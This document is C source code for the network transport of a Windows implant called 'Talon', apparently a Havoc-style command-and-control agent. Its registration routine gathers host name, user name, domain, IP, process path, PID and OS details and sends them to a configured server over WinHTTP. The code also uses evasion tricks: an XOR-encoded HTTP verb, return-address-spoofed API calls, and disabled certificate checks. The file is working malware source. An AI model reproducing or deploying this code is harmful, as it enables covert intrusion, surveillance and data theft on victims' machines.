#include <Talon.h>

#include <Transport.h>
#include <Command.h>
#include <Core.h>
#include <Spoof.h>

#include <iptypes.h>
#include <iphlpapi.h>
#include <winternl.h>
#include <winhttp.h>

#define DATA_FREE( d, l ) \
    memset( d, 0, l ); \
    LocalFree( d ); \
    d = NULL;

/* HTTP verb, XOR-encoded (key 0x5A per byte) so "POST" does not sit in .rdata */
static const UCHAR VerbXor[ 10 ] = { 0x0A, 0x5A, 0x15, 0x5A, 0x09, 0x5A, 0x0E, 0x5A, 0x5A, 0x5A };

/* Call a WinHttp API through the return-address spoofing trampoline when a
 * kernel32 gadget is available (SpoofInit), else directly — either way the
 * same import is used, only the visible return address differs. */
#define SPOOF_NARG( _1,_2,_3,_4,_5,_6,_7,_8,N,... ) N
#define SPOOF_PICK( ... ) SPOOF_NARG( __VA_ARGS__, SPOOF_G, SPOOF_F, SPOOF_E, SPOOF_D, SPOOF_C, SPOOF_B, SPOOF_A, SPOOF_X )
#define SPOOF_CALL( fn, ... ) \
    ( SpoofReady() ? ( HANDLE ) SPOOF_PICK( fn, __VA_ARGS__ )( fn, __VA_ARGS__ ) : ( HANDLE ) ( fn( __VA_ARGS__ ) ) )

BOOL TransportInit( )
{
    PPACKAGE         Package    = NULL;
    BOOL             Success    = FALSE;
    PVOID            Data       = NULL;
    PIP_ADAPTER_INFO Adapter    = NULL;
    OSVERSIONINFOEXW OsVersions = { 0 };
    SIZE_T           Length     = 0;

    Package = PackageCreate( COMMAND_REGISTER );

    // Add data
    /*
        [ SIZE         ] 4 bytes
        [ Magic Value  ] 4 bytes
        [ Agent ID     ] 4 bytes
        [ COMMAND ID   ] 4 bytes
        [ Demon ID     ] 4 bytes
        [ User Name    ] size + bytes
        [ Host Name    ] size + bytes
        [ Domain       ] size + bytes
        [ IP Address   ] 16 bytes?
        [ Process Name ] size + bytes
        [ Process ID   ] 4 bytes
        [ Parent  PID  ] 4 bytes
        [ Process Arch ] 4 bytes
        [ Elevated     ] 4 bytes
        [ OS Info      ] ( 5 * 4 ) bytes
        [ OS Arch      ] 4 bytes
    */

    // Add AES Keys/IV
    // PackageAddPad( Package, Instance.Config.AES.Key, 32 );
    // PackageAddPad( Package, Instance.Config.AES.IV,  16 );

    // Add session id
    PackageAddInt32( Package, Instance.Session.AgentID );

    // Get Computer name
    if ( ! GetComputerNameExA( ComputerNameNetBIOS, NULL, (LPDWORD) &Length ) ) {
        if ((Data = LocalAlloc(LPTR, Length))) {
            GetComputerNameExA(ComputerNameNetBIOS, Data, (LPDWORD) &Length);

        }
    }

    PackageAddBytes( Package, Data, Length );
    DATA_FREE( Data, Length );

    // Get Username
    Length = MAX_PATH;
    if ( ( Data = LocalAlloc( LPTR, Length ) ) ){
        GetUserNameA( Data, (LPDWORD) &Length );
    }

    PackageAddBytes( Package, Data, StrLenA( Data ) );
    DATA_FREE( Data, Length );

    // Get Domain
    if ( ! GetComputerNameExA( ComputerNameDnsDomain, NULL, (LPDWORD) &Length ) ) {
        if ((Data = LocalAlloc(LPTR, Length))) {
            GetComputerNameExA(ComputerNameDnsDomain, Data, (LPDWORD) &Length);
        }
    }
    PackageAddBytes( Package, Data, Length );
    DATA_FREE( Data, Length );

    GetAdaptersInfo( NULL, (PULONG) &Length );
    if ( ( Adapter = LocalAlloc( LPTR, Length ) ) )
    {
        if ( GetAdaptersInfo( Adapter, (PULONG) &Length ) == NO_ERROR )
        {
            PackageAddBytes( Package, Adapter->IpAddressList.IpAddress.String, StrLenA( Adapter->IpAddressList.IpAddress.String ) );

            memset( Adapter, 0, Length );
            LocalFree( Adapter );
            Adapter = NULL;
        }

        else {
            PackageAddInt32(Package, 0);
        }
    } else {
        PackageAddInt32(Package, 0);
    }


    Length = MAX_PATH;
    if ( ( Data = LocalAlloc( LPTR, Length ) ) )
    {
        Length = GetModuleFileNameA( NULL, Data, Length );
        PackageAddBytes( Package, Data, Length );
    } else { PackageAddInt32( Package, 0 ); }

    PackageAddInt32( Package, GetCurrentProcessId() );
    PackageAddInt32( Package, (DWORD) 0 );
    PackageAddInt32( Package, Instance.Session.ProcArch );
    PackageAddInt32( Package, FALSE ); // default

    memset( &OsVersions, 0, sizeof( OsVersions ) );
    OsVersions.dwOSVersionInfoSize = sizeof( OsVersions );
    Instance.Win32.RtlGetVersion( &OsVersions );

    PackageAddInt32( Package, OsVersions.dwMajorVersion );
    PackageAddInt32( Package, OsVersions.dwMinorVersion );
    PackageAddInt32( Package, OsVersions.wProductType );
    PackageAddInt32( Package, OsVersions.wServicePackMajor );
    PackageAddInt32( Package, OsVersions.dwBuildNumber );

    PackageAddInt32( Package, Instance.Session.OSArch );
    PackageAddInt32( Package, Instance.Config.Sleeping );
    PackageAddInt32( Package, Instance.Config.Jitter );
    PackageAddInt32( Package, Instance.Config.Transport.KillDate );
    PackageAddInt32( Package, Instance.Config.Transport.WorkingHours );
    // End of Options

    PRINT_HEX( Data, Length );

    if ( PackageTransmit( Package, &Data, &Length ) )
    {
        Dbg("TRANSMITTED PACKAGE!\n");
        PRINT_HEX( Data, Length );

        if ( Data )
        {
            Dbg( "Agent => %x : %x\n", ( UINT32 ) DEREF( Data ), ( UINT32 ) Instance.Session.AgentID );
            if ( ( UINT32 ) Instance.Session.AgentID == ( UINT32 ) DEREF( Data ) )
            {
                Dbg("CONNECTED!\n");
                Instance.Session.Connected = TRUE;
                Success = TRUE;
            }
        }
        else
        {
            Success = FALSE;
        }
    }

    return Success;
}

BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize )
{
    HANDLE  hConnect        = NULL;
    HANDLE  hSession        = NULL;
    HANDLE  hRequest        = NULL;
    LPWSTR  HttpEndpoint    = NULL;
    DWORD   HttpFlags       = 0;
    DWORD   HttpAccessType  = 0;
    LPCWSTR HttpProxy       = NULL;
    DWORD   BufRead         = 0;
    UCHAR   Buffer[ 1024 ]  = { 0 };
    WCHAR   HttpVerb[ 6 ]   = { 0 };
    PVOID   RespBuffer      = NULL;
    SIZE_T  RespSize        = 0;
    BOOL    Successful      = FALSE;

    HttpEndpoint = Instance.Config.Transport.Endpoint;

    /* decode the HTTP verb off .rdata */
    {
        SIZE_T i;
        for ( i = 0; i < sizeof( VerbXor ); i++ )
            ( ( PUCHAR ) HttpVerb )[ i ] = VerbXor[ i ] ^ 0x5A;
    }

    hSession = SPOOF_CALL( WinHttpOpen, Instance.Config.Transport.UserAgent, HttpAccessType, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
    if ( ! hSession )
    {
        Dbg( "WinHttpOpen: Failed => %d\n", GetLastError() );
        Successful = FALSE;
        goto LEAVE;
    }

    hConnect = SPOOF_CALL( WinHttpConnect, hSession, Instance.Config.Transport.Host, Instance.Config.Transport.Port, 0 );
    Dbg( "> WinHttpConnect=> %d\n", GetLastError() );
    if ( ! hConnect )
    {
        Dbg( "WinHttpConnect: Failed => %d\n", GetLastError() );
        Successful = FALSE;
        goto LEAVE;
    }

    HttpFlags = WINHTTP_FLAG_BYPASS_PROXY_CACHE;

    if ( Instance.Config.Transport.Secure ){
        HttpFlags |= WINHTTP_FLAG_SECURE;
    }

    hRequest = SPOOF_CALL( WinHttpOpenRequest, hConnect, ( LPCWSTR ) HttpVerb, HttpEndpoint, NULL, NULL, NULL, HttpFlags );
    Dbg( "> WinHttpOpenRequest=> %d\n", GetLastError() );

    if ( ! hRequest )
    {
        Dbg( "WinHttpOpenRequest: Failed => %d\n", GetLastError() );
        return FALSE;
    }

    if ( Instance.Config.Transport.Secure )
    {
        HttpFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
                    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

        if ( ! SPOOF_CALL( WinHttpSetOption, hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &HttpFlags, sizeof( DWORD ) ) )
        {
            Dbg( "WinHttpSetOption: Failed => %d\n", GetLastError() );
        }else{
            Dbg( "> WinHttpSetOption => %d\n", GetLastError() );

        }
    }

    // Send our data
    // PRINT_HEX(Data, Size)

    if ( SPOOF_CALL( WinHttpSendRequest, hRequest, NULL, 0, Data, Size, Size, 0x0 ) )
    {
        if ( RecvData && SPOOF_CALL( WinHttpReceiveResponse, hRequest, NULL ) )
        {
            RespBuffer = NULL;
            do
            {
                Successful = SPOOF_CALL( WinHttpReadData, hRequest, Buffer, 1024, &BufRead );
                if ( ! Successful || BufRead == 0 )
                {
                    if ( ! Successful )
                        Dbg( "WinHttpReadData: Failed (%d)\n", GetLastError() );
                    break;
                }

                if ( ! RespBuffer )
                    RespBuffer = LocalAlloc( LPTR, BufRead );
                else
                    RespBuffer = LocalReAlloc( RespBuffer, RespSize + BufRead, LMEM_MOVEABLE | LMEM_ZEROINIT );

                RespSize += BufRead;

                memcpy( RespBuffer + ( RespSize - BufRead ), Buffer, BufRead );
                memset( Buffer, 0, 1024 );

            } while ( Successful == TRUE );

            if ( RecvSize )
                *RecvSize = RespSize;

            if ( RecvData )
                *RecvData = RespBuffer;

            Successful = TRUE;
        }
    }
    else
    {
        if ( GetLastError() == 12029 ) { // ERROR_INTERNET_CANNOT_CONNECT
            Instance.Session.Connected = FALSE;
        }else {
            Dbg("WinHttpSendRequest: Failed => %d\n", GetLastError());
        }
        Successful = FALSE;
        goto LEAVE;
    }

LEAVE:
    memset( HttpVerb, 0, sizeof( HttpVerb ) ); /* clear the decoded verb from the stack */
    WinHttpCloseHandle( hSession );
    WinHttpCloseHandle( hConnect );
    WinHttpCloseHandle( hRequest );

    return Successful;
}

